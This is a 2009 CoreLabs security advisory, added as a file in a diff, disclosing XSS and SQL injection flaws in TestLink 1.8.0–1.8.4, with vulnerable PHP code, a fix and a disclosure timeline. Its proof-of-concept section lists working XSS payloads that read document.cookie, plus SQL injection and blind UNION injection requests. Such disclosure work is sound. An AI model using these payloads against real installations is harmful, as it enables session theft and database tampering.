@@ -1,0 +1,343 @@
+                                Core Security Technologies - CoreLabs
+Advisory
+                                        
+http://www.coresecurity.com/corelabs/
+
+Multiple XSS and Injection Vulnerabilities in TestLink Test Management
+and Execution System
+
+
+1. *Advisory Information*
+
+Title: Multiple XSS and Injection Vulnerabilities in TestLink Test
+Management and Execution System
+Advisory Id: CORE-2009-1013
+Advisory URL:
+http://www.coresecurity.com/content/testlink-multiple-injection-vulnerabilities
+Date published: 2009-12-09
+Date of last update: 2009-12-09
+Vendors contacted: TestLink Community
+Release mode: Coordinated release
+
+
+2. *Vulnerability Information*
+
+Class: Cross site scripting [CWE-79], SQL injection [CWE-89]
+Impact: Code execution
+Remotely Exploitable: Yes
+Locally Exploitable: No
+Bugtraq ID: 37258
+CVE Name: CVE-2009-4237, CVE-2009-4238
+
+
+3. *Vulnerability Description*
+
+ Multiple injection (both XSS [1] and SQL) vulnerabilities have been
+discovered in Testlink [2], a widely used test-case management
+application written in PHP [3]. One of the XSS vulnerabilities,
+discovered in its login screen, can be exploited without an
+authenticated session.
+
+
+4. *Vulnerable packages*
+
+   . TestLink 1.8.0
+   . TestLink 1.8.1
+   . TestLink 1.8.2
+   . TestLink 1.8.3
+   . TestLink 1.8.4
+   . Older versions are probably affected too, but they were not checked.
+
+
+5. *Non-vulnerable packages*
+
+   . TestLink 1.8.5
+
+
+6. *Solutions and Workarounds*
+
+ Upgrade to a non-vulnerable version, such as 1.8.5. TestLink features
+the option to upgrade a current installation in its install scripts.
+
+
+7. *Credits*
+
+ These vulnerabilities were discovered and researched by Pablo
+Annetta, from Core Security Technologies, during Core Bugweek 2009 as
+a member of the "Los Herederos de Don Pablo (HDP)" team.
+
+
+8. *Technical Description / Proof of Concept Code*
+
+ Most of these vulnerabilities are present in the Testlink code
+because the logic for the sanitization of user input is rudimentary.
+Each script sanitizes its own input, instead of abstracting this task
+to another layer of logic. Often only slashes are stripped, but html
+entities are almost never escaped.
+
+ The only vulnerability in this report that can be exploited without
+an authenticated session is a XSS vulnerability in Testlink's login
+page 'login.php'. This script gets a parameter named 'req', which is
+used by the application to set the next request to be made. All
+parameters are initialized in the 'init_args' function which doesn't
+sanitize its arguments appropriately as seen below.
+
+/-----
+function init_args()
+{
+    $args = new stdClass();
+    $_REQUEST = strings_stripSlashes($_REQUEST);
+    
+    $args->note = isset($_REQUEST['note']) ? $_REQUEST['note'] : null;
+    $args->login = isset($_REQUEST['tl_login']) ?
+trim($_REQUEST['tl_login']) : null;
+    $args->pwd = isset($_REQUEST['tl_password']) ?
+$_REQUEST['tl_password'] : null;
+
+    $args->reqURI = isset($_REQUEST['req']) ? $_REQUEST['req'] : null;
+    $args->preqURI = (isset($_REQUEST['reqURI']) &&
+strlen($_REQUEST['reqURI'])) ? $_REQUEST['reqURI'] : null;
+ 
+    return $args;
+}
+- -----/
+
+ This vulnerability can be verified by issuing the following request
+to a Testlink installation on localhost:
+
+/-----
+http://127.0.0.1/testlink/login.php?req=";><iframe src
+="http://www.coresecurity.com/content/xxxx"; width="100%"
+height="300"></iframe>
+- -----/
+
+
+ Other XSS vulnerabilities on different scripts can be exploited with
+an authenticated session. Proof of concept code follows:
+
+/-----
+http://127.0.0.1/testlink/lib/general/staticPage.php?key=";><script>alert(document.cookie)</script>
+
+http://127.0.0.1/testlink/lib/attachments/attachmentupload.php?id=1&tableName='<script>alert(document.cookie)</script>
+http://127.0.0.1/testlink/lib/events/eventviewer.php?startDate=";<script>alert(document.cookie)</script>
+http://127.0.0.1/testlink/lib/events/eventviewer.php?endDate=";<script>alert(document.cookie)</script>
+http://127.0.0.1/testlink/lib/events/eventviewer.php?logLevel=";<script>alert(document.cookie)</script>
+- -----/
+
+
+ There are more XSS attacks that can be executed with *an
+authenticated session* on installations that have *at least one test
+plan created*. Most of these are due to an 'echo' statement in
+TestLink's database functions that directly outputs SQL errors back to
+the browser without escaping html entities. This can be found on line
+181 of 'testlink/lib/functions/database.class.php', where some
+function such as 'htmlspecialchars' should be called on '
+$this->error($p_query)' and '$message'. A templating engine (TestLink
+uses Smarty for many other tasks) could also be used to output these
+errors.
+
+/-----
+if ( !$t_result ) {
+    echo "ERROR ON exec_query() - database.class.php <br>" .
+$this->error($p_query) . "<br>";
+  echo "<br> THE MESSAGE :: $message. "<br>";
+    return false;
+} else {
+    return $t_result;
+}
+- -----/
+
+ This proof of concept code triggers the vulnerabilities described above:
+
+/-----
+http://127.0.0.1//testlink/lib/testcases/searchData.php?doSearch=find&summary='&expected_results='<script>alert(document.cookie)</script>
+http://127.0.0.1//testlink/lib/testcases/searchData.php?doSearch=find&summary='&name=<script>alert(document.cookie)</script>
+http://127.0.0.1//testlink/lib/testcases/searchData.php?doSearch=find&summary='&steps=<script>alert(document.cookie)</script>
+http://127.0.0.1//testlink/lib/testcases/searchData.php?doSearch=find&summary='<script>alert(document.cookie)</script>
+- -----/
+
+ More XSS vulnerabilities can also be triggered because of the problem
+described above, but also because another independent XSS exists on
+'resultsMoreBuilds_buildReport.php' caused by not escaping the
+'search_notes_string', by issuing this request (also when logged into
+an installation with a Test Plan created):
+
+/-----
+http://127.0.0.1/testlink/lib/results/resultsMoreBuilds_buildReport.php?report_type=0&display_query_params=1&search_notes_string=</td><script>alert(document.cookie)</script>
+- -----/
+
+
+ With an authenticated session, the following SQL injection bug can
+also be exploited.
+
+ In 'http://127.0.0.1/testlink/lib/general/navBar.php', filling in the
+'Test Case ID' field with 'TC-1 or 1 = 1 update tcversions set summary
+= '</td><script>alert(document.cookie)</script><td>'' results in
+reflected HTML.
+
+ Also with an authenticated session the following blind SQL injection
+exists
+
+/-----
+http://127.0.0.1/testlink/lib/events/eventviewer.php?logLevel=1,1)%20union%20SELECT%20id%20FROM%20testplans%20%23
+- -----/
+
+
+9. *Report Timeline*
+
+. 2009-10-29:
+Core Security Technologies notifies Toshiyuki Kawanishi (at his
+@users.sourceforge.jp address) from the Teamst team of the
+vulnerabilities, offering a draft for this advisory in plaintext or
+encrypted form (if proper keys are sent). November 9th, 2009, is
+proposed as a release date.
+
+. 2009-11-02:
+Because no response was obtained from Toshiyuki at his
+@users.sourceforge.jp, Core Security Technologies tries to contact him
+using the "Contact" webform in http://www.teamst.org.
+
+. 2009-11-09:
+Since there is still no reply from Toshiyuki, Core now tries
+contacting Francisco Mancardi. November 23rd is now proposed as a
+release date.
+
+. 2009-11-09:
+Francisco Mancardi replies asking that a copy in plaintext of the
+advisory be sent to him, and also to Toshiyuki Kawanishi and Martin
+Havlat.
+
+. 2009-11-09:
+Core sends a draft for this advisory, including the technical
+description of the vulnerabilities, to Francisco Mancardi, Toshiyuki
+Kawanishi and Martin Havlat.
+
+. 2009-11-10:
+Martin Havlat replies acknowledging reception of the advisory draft,
+and tells Core that internal issue #2947 has been created in their bug
+tracking system to fix these bugs. He mentions these issues shall be
+fixed on release 1.8.5 of TestLink.
+
+. 2009-11-12:
+Core replies asking for more information regarding the release date of
+TestLink 1.8.5. An account is created by Core in TestLink's internal
+bug tracking system to access information about issue #2947.
+
+. 2009-11-17:
+Core requests again information regarding the release date of TestLink
+1.8.5 in order to schedule the release of this advisory accordingly,
+since no reply on this has been yet given by the TestLink developers
+contacted. Core also mentions that issue #2947 cannot be accessed by
+the user created in order to follow the development of a patch for the
+vulnerabilities reported here.
+
+. 2009-11-17:
+Francisco Mancardi replies specifying that "maybe [issue #2947] has
+private status".
+
+. 2009-11-20:
+Core asks once more for a release date for a fixed version of
+TestLink. The advisory is rescheduled for release on Monday 30th,
+November, since there is no information regarding the possibility of
+meeting the deadline of Monday 23rd by the TestLink team. Core also
+mentions that they are eager to passively monitor the progress of the
+TestLink developers in fixing these issues if access is given to issue
+#2947 to their created account on TestLink's bug tracking system.
+
+. 2009-11-26:
+Since there was no reply to their last e-mail, Core resends it,
+reminding the developers that their planned release date for the
+advisory is Monday 30th, and that they would like to know if there is
+a planned release date for a fixed version of TestLink. Core reminds
+the developers about their commitment in helping them in correctly
+fixing the bug, should they get access to private issue #2947.
+
+. 2009-11-27:
+Martin Havlat replies that due to priorities in the internal
+development group of Testlink the bug has not yet been fixed. He
+commits to release TestLink 1.8.5 as soon as this bug is fixed, but
+besides stating that he wished to have time to fix this himself, no
+firm or verifiable claim is made that can assure Core of a planned fix
+and release.
+
+. 2009-11-27:
+Core reschedules its internal publication date for this advisory to
+December 14th. This will be the final date and a user-release will be
+made, unless TestLink developers share information that can be
+verified by Core that shows commitment to eventually looking into said
+bugs and fixing them. Core suggests that developers actually in charge
+of these issues are copied in the e-mail loop, or that access to
+internal issue-tracking tools be given to them to actively participate
+in the discussions and the patching process.
+
+. 2009-11-30:
+Martin Havlat asks for technical details needed by him to confirm some
+of these vulnerabilities.
+
+. 2009-12-01:
+Core replies with the technical details needed by Martin Havlat.
+
+. 2009-12-02:
+Martin Havlat sends a patched version of TestLink to Core asking for
+verification of fixes to some of the vulnerabilities reported in this
+advisory.
+
+. 2009-12-03:
+Core replies saying that the fixes proposed by Martin Havlat fail to
+patch those specific vulnerabilities. The bugs are further researched
+by Core and the advisory draft is modified to include a more detailed
+explanation of these bugs. This technical information is shared by
+Core with Martin Havlat and some insight into possible fixes is also
+given.
+
+. 2009-12-09:
+TestLink 1.8.5 is released.
+
+. 2009-12-09:
+Advisory CORE-2009-1013 is published.
+
+
+10. *References*
+
+[1] http://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
+[2] http://www.teamst.org/
+[3] http://www.owasp.org/index.php/PHP_Top_5
+
+
+11. *About CoreLabs*
+
+CoreLabs, the research center of Core Security Technologies, is
+charged with anticipating the future needs and requirements for
+information security technologies. We conduct our research in several
+important areas of computer security including system vulnerabilities,
+cyber attack planning and simulation, source code auditing, and
+cryptography. Our results include problem formalization,
+identification of vulnerabilities, novel solutions and prototypes for
+new technologies. CoreLabs regularly publishes security advisories,
+technical papers, project information and shared software tools for
+public use at: http://www.coresecurity.com/corelabs.
+
+
+12. *About Core Security Technologies*
+
+Core Security Technologies develops strategic solutions that help
+security-conscious organizations worldwide develop and maintain a
+proactive process for securing their networks. The company's flagship
+product, CORE IMPACT, is the most comprehensive product for performing
+enterprise security assurance testing. CORE IMPACT evaluates network,
+endpoint and end-user vulnerabilities and identifies what resources
+are exposed. It enables organizations to determine if current security
+investments are detecting and preventing attacks. Core Security
+Technologies augments its leading technology solution with world-class
+security consulting services, including penetration testing and
+software security auditing. Based in Boston, MA and Buenos Aires,
+Argentina, Core Security Technologies can be reached at 617-399-6980
+or on the Web at http://www.coresecurity.com.
+
+
+13. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2009 Core Security
+Technologies and (c) 2009 CoreLabs, and may be distributed freely
+provided that no fee is charged for this distribution and proper
+credit is given.
